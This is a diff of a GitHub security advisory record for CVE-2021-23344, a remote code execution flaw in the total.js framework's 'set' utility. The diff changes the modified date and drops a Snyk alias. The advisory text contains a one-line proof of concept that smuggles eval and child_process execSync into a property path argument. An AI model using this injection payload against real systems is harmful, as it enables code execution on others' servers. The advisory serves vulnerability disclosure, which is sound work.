@@ -1,11 +1,10 @@
 {
 	"schema_version": "1.6.0",
 	"id": "GHSA-3wj8-vp9h-rm6m",
-	"modified": "2023-11-08T04:05:04.450510Z",
+	"modified": "2025-01-14T08:57:11.102422Z",
 	"published": "2021-03-19T21:32:20Z",
 	"aliases": [
-		"CVE-2021-23344",
-		"SNYK-JS-TOTALJS-1077069"
+		"CVE-2021-23344"
 	],
 	"summary": "total.js Remote Code Execution Vulnerability",
 	"details": "total.js is a framework for Node.js platfrom written in pure JavaScript similar to PHP's Laravel or Python's Django or ASP.NET MVC. It can be used as web, desktop, service or IoT application.\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) via `set`.\n\n### PoC\n```js\n// To be run in a nodejs console: \nrequire('total.js/utils').set({}, 'a;eval(`require(\"child_process\")\\\\x2eexecSync(\"touch pwned\")`);//')\n```",
